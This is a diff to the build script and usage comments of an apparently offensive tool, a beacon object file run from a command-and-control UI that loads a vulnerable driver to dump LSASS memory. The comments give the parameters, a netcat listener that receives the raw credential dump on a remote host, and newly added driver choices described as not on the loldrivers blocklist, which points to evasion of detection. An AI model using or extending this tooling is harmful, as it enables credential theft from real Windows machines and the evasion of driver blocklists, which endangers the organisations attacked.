@@ -9,7 +9,11 @@
 #
 # Then in Kassandra Mythic UI:
 #   executeBOF -> file_id: byovd_dump_bof.o
-#   parameters: bin:<base64_BiosToolCommonDriver.sys> str:192.0.2.254 int:9999
+#   parameters: bin:<base64_driver.sys> str:<receiver_ip> int:<port> int:<driver_type>
+#
+#   driver_type: 0 = BiosToolCommonDriver
+#                1 = RtsPpx (Realtek, novel - NOT on loldrivers)
+#                2 = RwDrv  (RWEverything, novel hash - NOT on loldrivers)
 #
 # On receiver (before running BOF):
 #   nc -lvp 9999 > lsass_raw.bin
@@ -46,8 +50,10 @@ $CC -c "$SRC" -o "$OUT" \
 echo "[+] Done: $OUT ($(wc -c < "$OUT") bytes)"
 echo ""
 echo "[*] Encode driver for BOF argument:"
-echo "    base64 -i BiosToolCommonDriver.sys | tr -d '\\n'"
+echo "    base64 -i <driver>.sys | tr -d '\\n'"
 echo ""
 echo "[*] Run in Kassandra executeBOF:"
 echo "    file_id: byovd_dump_bof.o"
-echo "    parameters: bin:<base64_driver> str:<receiver_ip> int:<port>"
+echo "    parameters: bin:<base64_driver> str:<receiver_ip> int:<port> int:<driver_type>"
+echo ""
+echo "    driver_type: 0=BiosTool  1=RtsPpx  2=RwDrv"
